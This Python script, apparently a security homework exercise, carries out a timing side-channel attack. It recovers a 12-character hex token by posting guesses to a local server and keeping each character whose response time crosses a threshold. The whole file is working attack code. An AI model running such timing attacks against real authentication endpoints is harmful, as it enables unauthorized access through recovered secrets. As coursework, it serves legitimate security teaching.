import json
import requests
import string
import timeit
import random

def attempt_token(token, i, letter):
    new_token = token + letter + RANDOM_STRING[i:]
    payload = {'token': new_token}
    resp = requests.post(URL, json=payload)
    return resp.status_code, resp.text

if __name__=='__main__':
    URL = 'http://0.0.0.0:8080/hw6/ex1'
    LENGTH = 12 # Found by trial and error
    TIME_THRESHOLD = 0.74
    RANDOM_STRING = '123456789ab' # Used to fill to length 12

    # Since it's a token, expect it to be composed of hex digits
    char_space = list(string.hexdigits) 
    random.shuffle(char_space)
    guess = ''
    for i in range(LENGTH):
        success = False
        while(not success): 
            for letter in char_space:
                elapsed = timeit.timeit(lambda: attempt_token(guess, i, letter), number=1)
                if (elapsed > TIME_THRESHOLD * (i+1)):
                    success = True
                    guess += letter
                    break

    payload = {'token': guess}
    resp = requests.post(URL, json=payload)